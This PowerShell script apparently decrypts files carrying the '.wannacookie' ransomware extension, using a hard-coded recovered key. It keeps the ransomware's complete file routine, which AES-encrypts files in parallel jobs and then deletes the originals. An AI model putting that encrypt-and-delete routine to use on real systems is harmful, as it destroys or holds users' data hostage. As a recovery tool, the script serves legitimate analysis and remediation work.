$p_keys = "fbcfc121915d99cc20a3d3d5d84f8308"

$functions = {
  function e_d_file ($key,$File,$enc_it,$rep) { [byte[]]$key = $key;
    $Suffix = "`.wannacookie";
    [System.Reflection.Assembly]::LoadWithPartialName('System.Security.Cryptography');
    [System.Int32]$KeySize = $key.Length * 8;
    $AESP = New-Object 'System.Security.Cryptography.AesManaged';
    $AESP.Mode = [System.Security.Cryptography.CipherMode]::CBC;
    $AESP.BlockSize = 128;
    $AESP.KeySize = $KeySize;
    $AESP.Key = $key;
    $FileSR = New-Object System.IO.FileStream ($File,[System.IO.FileMode]::Open);
    if ($enc_it) { $DestFile = $File + $Suffix } else { $DestFile = ($File -replace $Suffix,$rep) };
    $FileSW = New-Object System.IO.FileStream ($DestFile,[System.IO.FileMode]::Create);
    if ($enc_it) { $AESP.GenerateIV();
      $FileSW.Write([System.BitConverter]::GetBytes($AESP.IV.Length),0,4);
      $FileSW.Write($AESP.IV,0,$AESP.IV.Length);
      $Transform = $AESP.CreateEncryptor() } else { [Byte[]]$LenIV = New-Object Byte[] 4;
      $FileSR.Seek(0,[System.IO.SeekOrigin]::Begin) | Out-Null;
      $FileSR.Read($LenIV,0,3) | Out-Null;
      [int]$LIV = [System.BitConverter]::ToInt32($LenIV,0);
      [Byte[]]$IV = New-Object Byte[] $LIV;
      $FileSR.Seek(4,[System.IO.SeekOrigin]::Begin) | Out-Null;
      $FileSR.Read($IV,0,$LIV) | Out-Null;
      $AESP.IV = $IV;
      $Transform = $AESP.CreateDecryptor() };
    $CryptoS = New-Object System.Security.Cryptography.CryptoStream ($FileSW,$Transform,[System.Security.Cryptography.CryptoStreamMode]::Write);
    [int]$Count = 0;
    [int]$BlockSzBts = $AESP.BlockSize / 8;
    [Byte[]]$Data = New-Object Byte[] $BlockSzBts;
    do {
      $Count = $FileSR.Read($Data,0,$BlockSzBts);
      $CryptoS.Write($Data,0,$Count)
    } while ($Count -gt 0);
    $CryptoS.FlushFinalBlock();
    $CryptoS.Close();
    $FileSR.Close();
    $FileSW.Close();
    Clear-Variable -Name "key";
    Remove-Item $File
  }
};

function B2H { param($DEC);
  $tmp = '';
  foreach ($value in $DEC) { $a = "{0:x}" -f [int]$value;
    if ($a.Length -eq 1) { $tmp += '0' + $a } else { $tmp += $a }
  };
  return $tmp
};

function H2B { param($HX);
  $HX = $HX -split '(..)' | Where-Object { $_ };
  foreach ($value in $HX) { [Convert]::ToInt32($value,16) }
};

function e_n_d { param($key,$allfiles,$make_cookie);
  $tcount = 12;
  for ($file = 0;
    $file -lt $allfiles.Length;
    $file++) { while ($true) { $running = @(Get-Job | Where-Object { $_.State -eq 'Running' });
      if ($running.count -le $tcount) { Start-Job -ScriptBlock {
        param($key,$File,$true_false);
          try {
            e_d_file $key $File $true_false
          } catch {
            $_.Exception.Message | Out-String | Out-File $($env:userprofile + '\Desktop\ps_log.txt') -Append
          }
        } -args $key,$allfiles[$file],$make_cookie -InitializationScript $functions;
        break
      } else {
        Start-Sleep -m 200;
        continue
      }
    }
  }
};

[array]$f_c = $(Get-ChildItem *.wannacookie | ForEach-Object { $_.Fullname } );
foreach ($possible in $p_keys) {
  $b_k = $(H2B $possible);
  e_n_d $b_k $f_c $false $possible;
}
